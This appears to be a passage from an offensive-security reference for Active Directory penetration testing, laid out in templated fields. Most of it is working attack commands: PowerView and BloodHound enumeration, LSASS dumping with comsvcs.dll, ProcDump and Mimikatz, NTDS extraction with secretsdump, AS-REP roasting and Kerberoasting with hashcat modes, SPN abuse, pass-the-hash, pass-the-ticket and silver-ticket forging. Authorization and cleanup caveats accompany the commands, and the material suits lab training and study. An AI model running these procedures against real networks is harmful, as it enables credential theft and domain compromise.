```powershell $root = [ADSI]'LDAP://RootDSE' $base = [ADSI]("LDAP://" + $root.defaultNamingContext) $searcher = New-Object System.DirectoryServices.DirectorySearcher($base) $searcher.PageSize = 1000 $searcher.PropertiesToLoad.AddRange(@('samaccountname','userprincipalname','objectsid','memberof','serviceprincipalname','description','useraccountcontrol','pwdlastset','lastlogontimestamp')) $searcher.Filter = '(&(objectCategory=person)(objectClass=user))' $searcher.FindAll() | ForEach-Object { $_.Properties } ``` Change only the filter and requested attributes for another object class: ```powershell # Groups $searcher.Filter = '(objectCategory=group)' $searcher.PropertiesToLoad.Clear() $searcher.PropertiesToLoad.AddRange(@('samaccountname','objectsid','member','grouptype','description')) $searcher.FindAll() | ForEach-Object { $_.Properties } # Computers $searcher.Filter = '(objectCategory=computer)' $searcher.PropertiesToLoad.Clear() $searcher.PropertiesToLoad.AddRange(@('dnshostname','operatingsystem','operatingsystemversion','serviceprincipalname','useraccountcontrol','lastlogontimestamp')) $searcher.FindAll() | ForEach-Object { $_.Properties } ``` > `PageSize = 1000` asks for paged results; without paging, the server's result-size limit can silently produce an incomplete inventory. LDAP filters are data selection, not proof of access or exploitability. ##### Discover the naming context ```bash ldapsearch -x -LLL -H ldap://DC_HOST:389 -s base -b '' \ defaultNamingContext configurationNamingContext rootDomainNamingContext dnsHostName ``` ##### Users, groups and computers ```bash ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user))' \ sAMAccountName userPrincipalName objectSid userAccountControl memberOf description servicePrincipalName pwdLastSet lastLogonTimestamp adminCount ``` ```bash ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(objectCategory=group)' sAMAccountName objectSid member groupType description ``` ```bash ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(objectCategory=computer)' dNSHostName operatingSystem operatingSystemVersion servicePrincipalName userAccountControl lastLogonTimestamp ```
SPNs, trusts and GPO/OU context ```bash # SPN-bearing accounts: mapping only; do not request tickets in this block. ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \ sAMAccountName servicePrincipalName memberOf userAccountControl pwdLastSet ``` ```bash # Trusted-domain objects ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -b 'DC=DOMAIN,DC=TLD' '(objectClass=trustedDomain)' \ cn securityIdentifier trustDirection trustType trustAttributes ``` ```bash # OUs and GPO containers; correlate links before inferring host effect. ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(|(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))' \ distinguishedName displayName name gPLink gPOptions ```
##### LDAP failure router | Result | Interpretation | Next action | | --- | --- | --- | | `Invalid credentials (49)` | Bind identity/secret/context failed; subcodes may refine the cause | Recheck UPN vs `DOMAIN\USER`, account state and exact secret; do not infer authorization | | `Strong(er) authentication required` / confidentiality required | Server policy rejects that bind/transport | Use the permitted LDAPS/StartTLS or Kerberos/SASL path; do not disable protections | | `Size limit exceeded` or suspiciously round count | Search is incomplete | Add paged results and narrow the base/filter | | Referral/partial results | Search crossed a naming-context boundary | Query the referred domain/partition or compatible Global Catalog deliberately | | Bind succeeds, search empty | Wrong base/filter, ACL filtering or genuinely no matches | Verify RootDSE base, test a known object and request fewer attributes | | Works by IP, Kerberos fails | Route exists but name/SPN/DNS/time path is wrong | Use DC FQDN, AD DNS, correct realm and synchronized time | ```powershell Import-Module .\PowerView.ps1 Get-Command -Module PowerView Get-Domain Get-DomainController Get-DomainTrust Get-DomainUser | Select-Object samaccountname,userprincipalname,description,memberof,serviceprincipalname Get-DomainGroup Get-DomainGroupMember -Identity 'GROUP' -Recurse Get-DomainComputer | Select-Object dnshostname,operatingsystem,operatingsystemversion Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof ``` The original PowerSploit repository is archived. Course examples and forks may use legacy aliases such as `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer` or `Get-NetDomainTrust`. Inspect `Get-Command`/`Get-Help` for the exact copy present rather than mixing generations. ```text NEW PASSWORD/HASH/KEY/TICKET -> VERIFY TYPE, CLIENT, REALM, VALIDITY -> AUTHENTICATE THROUGH ONE COMPATIBLE SERVICE -> CONFIRM IDENTITY -> REPEAT GROUP/ACL/SHARE/HOST/SESSION/ROUTE MAPPING ``` Do not overwrite the old state. Record which source produced the material and which protocol accepted it.

methods.result: Policy/scripts/configuration and typed credential or host clues
methods.mechanics: Domain-readable scripts and policy artifacts can disclose paths, service accounts or historical secrets. A script's presence does not prove that its credentials are current or that it runs with high privilege.
methods.example: Observation: a readable login script references a backup account. Test: inspect the relevant configuration and validate any recovered secret in context. Illustrative output: a credential opens another share. Interpretation: re-enumerate that identity's available objects.
methods.verify: Prove read access and actual artifact content; keep recovered real secrets private.

methods.procedure:
##### Inventory, then test the object

```cmd
net view \\DC_HOST
dir \\DC_HOST\SYSVOL
dir \\DC_HOST\NETLOGON
```

```bash
nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' --shares
smbclient -L //DC_IP -U 'DOMAIN/USER'
smbclient //DC_IP/SYSVOL -U 'DOMAIN/USER' -c 'recurse ON; ls'
smbclient //DC_IP/SHARE -U 'DOMAIN/USER'
```

Inside `smbclient`, use `ls`, `cd`, `get FILE` and a harmless approved `put` only when write validation is needed. Share listing, share connection, file read and file write are separate permissions.

Inspect authorized readable policy/logon/deployment paths for scripts, configurations, backups, connection strings and legacy Group Policy Preferences XML containing `cpassword`. Selectively retrieve relevant files; do not bulk-copy a share merely because it is readable. A discovered secret returns to the credential-classification procedure.

methods.title: Validate effective directory-object control
methods.family: Effective rights, host access and path ranking
methods.clue: An ACL/graph edge names GenericAll, GenericWrite, WriteDacl, WriteOwner or an extended/property right
methods.conditions: Effective trustee membership, target object/type, inheritance/deny behavior and the exact permitted operation
methods.access: A known domain identity or a directory endpoint that permits the selected anonymous query
methods.result: A verified object-control primitive suitable for a named identity transition
methods.mechanics: Object rights are operation-specific. GenericWrite on a user is not a universal password-reset right; inherited ACEs and protected objects can change applicability.
methods.example: Observation: a graph suggests a password-reset edge. Test: resolve the ACE and controlled user's effective membership against the actual target. Illustrative output: the required extended right applies. Interpretation: assess the reset's impact and select the intended transition.
methods.verify: Verify principal, object SID/type and effective permitted modification; preserve original ACL/state before changes.
methods.failure: A stale graph, inherited scope mismatch or deny/protected-object behavior can invalidate the edge.

recognition.where: Select a useful user/group/computer/domain object from mapping and resolve its ACE trustees, rights and object-specific scopes.
recognition.sample:
SecurityIdentifier: CONTROLLED_GROUP_SID
ActiveDirectoryRights: WriteDacl
Target: TARGET_OBJECT
recognition.spot: A DACL-control ACE for a possibly controlled trustee opens an intermediate-right candidate.
recognition.confirm: Resolve the ACE's trustee and group nesting, target object class, GUID and inheritance/deny scope. For password reset, group writes or DACL changes open that exact operation's procedure and check its additional conditions before modifying anything.
recognition.enabled: The trustee and exact right apply to the target: select the corresponding object transition.
recognition.ruledout: The ACE applies to another object type/trustee or is overridden: reject that edge.
recognition.unknown: A graph label or unresolved SID does not establish current effective control.

methods.procedure:
```powershell
Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight|WriteProperty|Self' } |
  Select-Object ObjectDN,IdentityReference,ActiveDirectoryRights,ObjectAceType,AceType,IsInherited,InheritanceType
```

If `IdentityReference` is an unresolved SID, resolve it and trace whether the controlled user reaches it through direct or nested group membership.

| Candidate right | Possible transition to validate later | Missing proof now |
| --- | --- | --- |
| `GenericAll` | Broad object modification | Controlled trustee, target object class, applicable deny/inheritance and useful change |
| `GenericWrite` / `WriteProperty` | Change one or more writable attributes | Exact attribute/object GUID and a transition that consumes it |
| `WriteOwner` | Become owner | Ability to change the DACL afterward and use the resulting right |
| `WriteDacl` | Add an ACE | Effective write-DACL right, planned narrow ACE and restoration |
| `AllExtendedRights` / `ForceChangePassword` | Extended operation such as reset where applicable | Object class, exact extended right and downstream usefulness |
| `Self` / validated write | Add self/member or another validated attribute where schema permits | Correct validated-write GUID and target type |
| GPO/OU control | Affect linked computers/users | Writable GPO component, effective link/scope, refresh/trigger and target placement |

An ACE is one rule. Effective access depends on trustee/group nesting, allow/deny semantics, inheritance, object-specific GUIDs and security descriptor scope. Do not perform the modification in this mapping block.

> **Model:** controlled principal → effective ACE → target object/type → permitted modification → authentication/authorization effect → cleanup.

Enumerate a target's ACL with resolved GUIDs:

```powershell
Import-Module .\PowerView.ps1
Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight' }
```

Resolve trustees:

```powershell
ConvertFrom-SID 'S-1-5-21-...'
Get-DomainObject -Identity 'S-1-5-21-...' | Select-Object samaccountname,objectclass
```

Common effects require different rights:

| Right/object | Possible controlled effect | Validation needed |
| --- | --- | --- |
| `GenericAll`/password-reset extended right on user | Reset the user's password | Effective trustee, account state, protected-object behavior |
| `GenericAll` or effective member-attribute write on group | Add a controlled principal to the group | Target group, nesting and a refreshed logon token |
| `GenericWrite`/SPN-property write on user | Add a temporary SPN, request a TGS and remove it | Exact property right, duplicate-SPN checks and cleanup |
| `WriteDacl` | Grant a narrower right | Ability to write DACL and restore original ACL |
| `WriteOwner` | Change owner, then possibly DACL | Owner semantics and cleanup |
| Computer-object write | RBCD-related attribute change | Machine account/control, SPN/Kerberos and target service |

methods.family: Effective rights, host access and path ranking
methods.clue: Group-to-host access edges or a privileged user's possible session

methods.access: A known domain identity or a directory endpoint that permits the selected anonymous query
methods.result: Verified service access or a prioritized host/session hypothesis
methods.mechanics: Local admin, RDP, WinRM and share-read relationships grant different capabilities. A historical session does not guarantee current credential material or the right to read it.
methods.example: Observation: a graph marks a user as able to RDP to a host. Test: validate the reachable RDP service and effective logon right. Illustrative output: RDP works but remote service creation is denied. Interpretation: retain the actual access form and inspect that host's new opportunities.
methods.verify: Record the destination-specific successful action and freshness/limits of session evidence.
methods.failure: Collection denial is not proof that no sessions exist; a valid credential is not proof of every host-access method.

recognition.sample:
SMB authentication: accepted
SHARE: READ
RDP/WinRM/WMI authorization: not established
recognition.spot: A permitted SMB action identifies a host capability; it does not establish RDP/WinRM/SCM rights. Investigate sessions only with a supported, permitted remote query.
recognition.confirm: Verify actual group effectiveness, service/logon rights, session freshness and collection visibility.

methods.procedure:
```powershell
Find-LocalAdminAccess
```

```bash
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
```

`Find-LocalAdminAccess` is a broad candidate generator and can be noisy or blocked by firewall/RPC controls. Validate a selected host with the service you may actually use. NetExec's `(Pwn3d!)` indicates administrative SMB context according to that tool; it does not establish RDP, WinRM, WMI/DCOM or directory rights. RDP, WinRM, SMB/service control and WMI/DCOM each have different ports, services, policies and authorization.

```powershell
Get-NetSession -ComputerName COMPUTER -Verbose
Get-NetLoggedon -ComputerName COMPUTER
```

```cmd
PsLoggedOn.exe \\COMPUTER
```

`Get-NetSession` relies on workstation/session enumeration APIs that modern Windows may restrict. PsLoggedOn combines Registry profile evidence with `NetSessionEnum`; remote Registry access and sufficient rights are relevant, and querying can itself create a network-session entry. Therefore:

- empty/denied is **inconclusive**, not proof of no users;
- a session is a time-sensitive observation, not a durable ACL;
- a session matters only if the current identity can reach/control that host and a later credential/ticket technique applies;
- session presence does not prove credentials are resident, accessible or reusable.

methods.family: Effective rights, host access and path ranking

methods.mechanics: BloodHound models collected relationships, which may be stale or incomplete. Directory-only collection and host/session collection answer different questions and have different contact/rights requirements.

methods.procedure:
##### Current SharpHound CE Low-noise directory baseline that avoids contacting every workstation: ```powershell .\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip ``` Add host facts only when they can answer the next question: ```powershell .\SharpHound.exe --CollectionMethods LocalGroup --ComputerFile .\candidate-hosts.txt --OutputDirectory .\bh --ZipFileName candidate-localgroups.zip .\SharpHound.exe --CollectionMethods Session --ComputerFile .\candidate-hosts.txt --Loop --LoopDuration 00:10:00 --OutputDirectory .\bh --ZipFileName candidate-sessions.zip ``` SharpHound with no collection flag uses its broader default, including directory data plus local-group/session attempts. `All` performs every supported method; it is not the first response to an unanswered narrow question. Import the output ZIP into a compatible BloodHound CE deployment and verify node/edge counts and ingestion errors.
Collector variants and compatibility ```powershell # Inspect the actual collector before using copied syntax. .\SharpHound.exe --help ``` ```bash # Community Linux collector; flags and output compatibility vary by release. bloodhound-python --help bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -ns DC_IP -dc DC_HOST -c All --zip ``` ```powershell # Legacy/course PowerShell collector; use only with a compatible legacy deployment. Import-Module .\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All -OutputDirectory .\bh -ZipFileName legacy.zip ``` Use the collector version intended for the BloodHound deployment. `bloodhound-python`, legacy SharpHound PowerShell and current SharpHound CE are alternatives with different schemas/features, not interchangeable command spellings.
##### Analyze in this order 1. Mark only identities/hosts actually controlled. A low-privilege session on a host does not make the host itself fully owned. 2. Inspect the controlled principal's direct and nested group memberships and outbound object-control edges. 3. Inspect reachable computers where it has local admin, RDP, WinRM/DCOM or other applicable rights. 4. Inspect high-value goals and shortest paths only as hypothesis generation. 5. Classify each selected edge: - directory/static-ish: group, ACL, GPO, OU, trust; - host-derived: local group or user right; - volatile: session; - route-dependent: the required host/service must be reachable now. 6. Reproduce the minimum important relationship manually before handing it to Block 11 or 12. ```text ID | CONTROLLED PRINCIPAL | RELATIONSHIP | TARGET | SOURCE EVIDENCE | EFFECTIVE? | ROUTE/SERVICE | VOLATILITY | EXPECTED TRANSITION | MINIMUM VALIDATION | STATUS | NEXT BLOCK ``` Rank candidates by: 1. confidence that the relationship is effective; 2. deterministic value of the resulting identity/access; 3. route and service availability; 4. stability versus volatile session timing; 5. reversibility and impact; 6. number of unsupported assumptions. Prefer a validated readable share/credential clue or direct object right over a multi-edge path built from stale sessions and unreachable hosts.

methods.title: Obtain accessible live logon-session credential material
methods.clue: A controlled Windows host may hold useful logged-on identities

methods.mechanics: LSASS material depends on logon type, authentication package, session lifetime and protection. Administrator membership alone does not guarantee readable credentials or plaintext passwords.
methods.checks:
```cmd

query user
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

Illustrative output: an NT hash is available but no plaintext password. Interpretation: classify it and select a compatible authorized service.
methods.verify: Tie each artifact to an account, source/logon session and material type; independently validate any useful reuse.
methods.failure: Protected process access denial, absent sessions and unsupported parsing are different outcomes. Prefer an accessible ticket or other matched source when available.

```cmd
query user

```

Session list: DOMAIN\USER may be present
RunAsPPL: enabled
recognition.spot: A useful session is a possible source, while PPL/protection can prevent the chosen process-memory access.

methods.procedure:
| Source | What it can contain | Typical prerequisite | Result is not automatically |
| --- | --- | --- | --- |
| Current ticket cache | TGTs and service tickets for the current logon session | Current user; other LUIDs normally require elevation | A password, NT hash or authorization to every service |
| LSASS memory/dump | Logon-session NTLM/AES/DPAPI material and tickets, depending on OS/protection/logon type | Administrator/SYSTEM, suitable debug/dump access, compatible architecture | Guaranteed cleartext or every user's reusable secret |
| SAM + SYSTEM | Local account password hashes | Administrator/SYSTEM/backup-capable access to matched hives | Domain-account material |
| SECURITY + SYSTEM | LSA secrets, service/machine secrets, cached domain verifiers | Administrator/SYSTEM/backup-capable access to matched hives | Directly passable cached-domain hashes |
| Credential Manager/DPAPI | Targeted saved credentials and protected application data | Suitable user/machine context plus master-key material | Plaintext merely because a blob/file is readable |
| NTDS + SYSTEM | Domain account hashes/keys from a DC database | DC-level file access and matched boot-key material | Ordinary member-server admin access |
| DRS replication | Selected domain-account secrets | Effective replication rights at the domain root | Local admin, DC service access or Domain Users membership |

```cmd
whoami /all
tasklist /fi "imagename eq lsass.exe"
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard /v LsaCfgFlags
```

```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesConfigured,SecurityServicesRunning,VirtualizationBasedSecurityStatus
```

Interpretation:

- membership in Administrators with a medium-integrity filtered token is not equivalent to an elevated process;
- `SeDebugPrivilege` must be present and usable for common live-process access;
- a missing registry value is not definitive proof that a protection is disabled because defaults, policy and firmware state matter;
- LSA protection blocks untrusted code injection/process-memory access; Credential Guard isolates selected NTLM, Kerberos and saved-domain secrets with VBS;
- EDR/AV can block a tool or dump path without proving the underlying credential source is empty.

An access-denied or empty result disproves only that method in the current context.

##### Direct Mimikatz access

```text
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```

Decisive output is a named logon session with a typed value: NTLM, AES key, DPAPI key or ticket. A username with `Password : (null)` is not a failed tool run when another useful field exists, and modern Windows commonly does not retain reusable cleartext.

##### Dump first, parse offline

Built-in `comsvcs.dll` method from an elevated command prompt:

```cmd
for /f "tokens=2" %A in ('tasklist ^| findstr /i lsass.exe') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %A C:\Windows\Temp\lsass.dmp full
```

Sysinternals ProcDump alternative:

```cmd
procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

Parse with a compatible Mimikatz build:

```text
mimikatz.exe
sekurlsa::minidump C:\Path\To\lsass.dmp
sekurlsa::logonpasswords
sekurlsa::tickets
```

Common failures:

- dump creation denied: token/protection/EDR or process-access prerequisite failed;
- `ProcessorArchitecture` mismatch: use compatible x64/x86 tooling;
- OS major-version mismatch: parse with a compatible build/environment;
- dump succeeds but secrets are absent: logon type, sign-out/reboot, Credential Guard and provider behavior affect contents.

LSASS dumps are sensitive and noisy. Hash the evidence if needed, transfer through the established route, store it privately and remove the target copy after the authorized objective.

```powershell
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured,DeviceGuardSecurityServicesRunning
```

Credential Guard can isolate reusable domain secrets from ordinary LSASS memory. It does not erase local SAM, file, vault, DPAPI, ticket, service-configuration or directory-right paths. One failed dump method disproves only that method and context. Intrusive SSP interception changes system state and waits for a future logon; it is not the default Block 5 response.



DPAPI reasoning:

```text
PROTECTED BLOB
-> MASTER-KEY GUID
-> USER OR MACHINE PROTECT SCOPE
-> MASTER-KEY DECRYPTION MATERIAL
-> APPLICATION-SPECIFIC DECODING
```

Possible decryption material includes the already logged-on user context, the user's password/NT hash, machine context or a domain DPAPI backup key. Prefer using the authorized existing context rather than copying unrelated protected data. One blob without its master key/context is incomplete.

methods.procedure:
##### Offline NTDS from an already controlled DC

An offline parse needs a matched `NTDS.dit` and SYSTEM hive:

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM.hive LOCAL
```

Obtaining locked DC database files normally requires DC-level privilege and a snapshot/backup-aware method. Ordinary local administrator on a member server does not provide this material.

##### Remote collection

```bash
impacket-secretsdump -dc-ip DC_IP 'DOMAIN/USER:PASSWORD@DC_HOST'
```

```bash
impacket-secretsdump -hashes :NT_HASH -dc-ip DC_IP 'DOMAIN/USER@DC_HOST'
```

This broad form can invoke several remote collection paths and is high impact. Use it only when the lab objective and privileges justify those sources. For replication rights and a bounded one-user request, use [DCSync](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#dcsync-replication-rights).

TARGET_USER    4194816
Bit 0x400000: set

methods.procedure:
##### Why AS-REP roasting works

Ordinary Kerberos preauthentication makes the user prove knowledge of the long-term key before the KDC returns AS-REP material. If the account has `DONT_REQUIRE_PREAUTH`, an unauthenticated requester can ask for an AS-REP whose encrypted component can be tested offline against password candidates.

```text
KNOWN USERNAME + PREAUTH DISABLED + KDC REACHABLE
-> AS-REP CIPHER
-> OFFLINE GUESSING
-> PASSWORD ONLY IF A CANDIDATE VERIFIES
```

##### One known user, no password

```bash
impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request \
  -dc-ip DC_IP -outputfile asrep-TARGET_USER.hashes
```

##### Supplied user list, no password

```bash
impacket-GetNPUsers 'DOMAIN/' -no-pass -request -usersfile users.txt \
  -dc-ip DC_IP -outputfile asrep.hashes
```

##### Authenticated directory-backed discovery

```bash
impacket-GetNPUsers 'DOMAIN/USER' -request \
  -dc-ip DC_IP -outputfile asrep.hashes
```

Omitting the password from the target lets the tool prompt rather than storing it in shell history.

##### Windows/Rubeus alternative

```cmd
Rubeus.exe asreproast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:asrep.hashes /format:hashcat
```

##### Interpret before cracking

| Output | Meaning | Next action |
| --- | --- | --- |
| `$krb5asrep$23$` | RC4 AS-REP offline verifier | Hashcat mode 18200 |
| AS-REP with another etype | Different cipher/format | Match the exact prefix to installed Hashcat/John support |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User/realm not found | Recheck spelling, realm and DC |
| Preauthentication required / no `UF_DONT_REQUIRE_PREAUTH` | Account is not roastable through this method | Disprove this path for that account |
| Timeout/name error | KDC route/DNS problem | Fix route/FQDN/time before account conclusions |

```bash
hashcat -m 18200 asrep.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep.hashes --show
```

Do not call the account compromised because a hash was captured. Only a verified offline candidate produces a password, and that password still needs identity/access mapping.

methods.procedure:
##### Why Kerberoasting works Any valid domain identity can normally request a service ticket for an SPN. The ticket is encrypted with key material belonging to the SPN account, allowing offline password guessing. ```text VALID DOMAIN IDENTITY + SPN ACCOUNT + KDC ROUTE -> TGS-REP CIPHER -> OFFLINE GUESSING -> SERVICE-ACCOUNT PASSWORD IF A CANDIDATE VERIFIES ``` Rank SPN accounts before requesting tickets: group/ACL value, service/host, account type, password age, enabled state and resulting access matter more than collecting every ticket. ##### Enumerate without requesting tickets ```bash impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /stats /domain:DOMAIN /dc:DC_HOST ``` ##### Request one selected user ```bash impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile kerberoast-TARGET_USER.hashes 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes ```
Request all mapped candidates ```bash impacket-GetUserSPNs -request -dc-ip DC_IP \ -outputfile kerberoast.hashes 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes ``` Use broad requests only when scope and the candidate inventory justify them. Prefer one ranked account during verification.
##### Hash type and cracking | Prefix | Kerberos etype | Hashcat mode | | --- | ---: | ---: | | `$krb5tgs$23$` | RC4-HMAC | 13100 | | `$krb5tgs$17$` | AES128 | 19600 | | `$krb5tgs$18$` | AES256 | 19700 | ```bash hashcat -m 13100 kerberoast.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19600 kerberoast-aes128.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19700 kerberoast-aes256.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m MODE HASH_FILE --show ``` Select the mode from the actual prefix and current `hashcat --example-hashes`; do not assume every TGS is RC4. AES material is still an offline verifier but generally costs more per guess. Cracking feasibility is governed mainly by password strength and candidates, not merely ticket acquisition. ##### Common failures - no SPNs returned: wrong domain/base/authentication context, filtering or no user SPNs; - `KDC_ERR_S_PRINCIPAL_UNKNOWN`: SPN is absent/malformed or queried in the wrong realm; - `KDC_ERR_ETYPE_NOSUPP`: requested cipher conflicts with account/domain policy; - output wraps or fails to load: save directly to an output file and verify prefix/line integrity; - crack exhausts candidates: password not represented by the tested model; the account is not therefore “secure.”

methods.clue: A controlled principal can write a user's servicePrincipalName

methods.example: Observation: a user has no SPN but the controlled identity has the required property write. Test: add a unique temporary value, request that user's TGS and remove the value. Illustrative output: the artifact is obtained and the original SPN set is restored. Interpretation: recover offline if feasible.

methods.procedure:
If Block 10 proved effective write access to a user object's `servicePrincipalName`, an SPN can be temporarily added, requested and removed. This is a state-changing directory attack and must preserve original state.

Built-in SPN operations:

```cmd
setspn -L TARGET_USER
setspn -S temporary/TARGET_USER TARGET_USER
```

Request only that account:

```bash
impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \
  -outputfile targeted-TARGET_USER.hashes 'DOMAIN/USER'
```

Cleanup:

```cmd
setspn -D temporary/TARGET_USER TARGET_USER
setspn -L TARGET_USER
```

The controlled right must apply to the SPN attribute, `-S` must not collide with an existing SPN, and cleanup is part of the procedure. A recovered password is still validated and mapped as a new identity.

If the effective right permits writing `servicePrincipalName` on a user, add a unique temporary SPN, request that account's ticket and remove the SPN immediately. The cracking workflow is in [Kerberos and identity transitions](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md).

```powershell
setspn -S TEMP/TARGET_USER TARGET_USER
setspn -Q TEMP/TARGET_USER
Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat
setspn -D TEMP/TARGET_USER TARGET_USER
```

methods.procedure:
```cmd
klist
klist tgt
klist sessions
klist -li 0xLUID tickets
klist -li 0xLUID tgt
Rubeus.exe triage
Rubeus.exe dump /luid:0xLUID /nowrap
```

> Do not run `klist purge` during triage.

| Field/pattern | Interpretation | Decision |
| --- | --- | --- |
| `Client: USER @ REALM` | Identity represented | Map that exact user/computer and realm |
| Client ending in `$` | Computer identity | Establish machine-account rights; do not treat as a human user |
| `Server: krbtgt/REALM` | TGT | Can request service tickets while valid, within that client's authorization |
| `Server: cifs/HOST` | CIFS service ticket | Only SMB/CIFS on the named host; authorization still applies |
| `Server: ldap/DC_HOST` | LDAP service ticket | LDAP authentication, not replication rights |
| Other `SERVICE/HOST` | Ticket for that SPN | Use matching hostname/service/client |
| `Start/End/Renew Time` | Validity windows | Import cannot revive an expired/not-yet-valid ticket |
| Ticket flags | Kerberos behavior/history | Not evidence of privilege |
| `Kdc Called` | Issuing KDC | Not evidence of access to that DC |
| Encryption/session key | Compatibility/policy clue | Not privilege or password strength |

Linux cache:

```bash
klist -c ticket.ccache
export KRB5CCNAME="$PWD/ticket.ccache"
```

Convert only when a client expects the other container:

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

These commands establish a local ticket context. Block 12 selects and validates the remote service.

Windows/Rubeus:

```cmd
Rubeus.exe ptt /ticket:ticket.kirbi
klist
```

Windows/Mimikatz:

```text
kerberos::ptt ticket.kirbi
kerberos::list
```

Linux:

```bash
export KRB5CCNAME="$PWD/ticket.ccache"
klist
```

NT hash or AES key to a TGT:

```cmd
Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt
klist
```

Use `/aes128:` or `/aes256:` when that is the actual key type and tool version supports it. RC4-based requests can fail where RC4 is disabled even though the NT hash is correct.

Mimikatz creates a new process using supplied key material:

```text
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:cmd.exe
```

This is a credential/ticket-context transition, not proof that a destination accepts the identity.

```cmd
klist
klist tgt
klist sessions
```

When privileges permit inspecting another logon session:

```cmd
klist -li 0xLUID tickets
klist -li 0xLUID tgt
```

```cmd
Rubeus.exe triage
Rubeus.exe dump /luid:0xLUID /nowrap
```

> Do not use `klist purge` during triage. It destroys cached tickets and can break the current session. methods.mechanics: A silver ticket is encrypted for a service account rather than issued through a new domain TGT. Its acceptance depends on service/PAC validation; it is not universal domain-administrator authority.
methods.example: Observation: a known service key and domain SID are available. Test: match the intended SPN and documented acceptance conditions. Illustrative output: a CIFS operation succeeds under the crafted ticket while WinRM does not. Interpretation: retain the exact service scope.

methods.procedure:
> **Prerequisite:** key/hash of the account encrypting the target SPN's tickets, domain SID, exact SPN/service/host, a plausible existing domain identity and compatible target-service validation behavior.

Linux/Impacket:

```bash
impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID \
  -domain DOMAIN -spn cifs/TARGET_HOST AUTHORIZED_TEST_USER
export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
klist
```

Windows/Mimikatz:

```text
kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /target:TARGET_HOST /service:cifs /rc4:SERVICE_NT_HASH /user:AUTHORIZED_TEST_USER /ptt
```

Despite the Mimikatz module name, supplying a service/target key produces a silver/service ticket, not a krbtgt-signed TGT.

Important boundaries:

- the key must belong to the account that owns the SPN; machine-account keys commonly protect host services;
- the ticket is limited to the named service/host and whichever services share the same account key;
- current PAC enforcement means using a nonexistent identity can fail; use a real authorized test identity and validate behavior;
- a service may perform KDC/PAC validation or additional authorization;
- a successfully imported ticket is not successful service access.

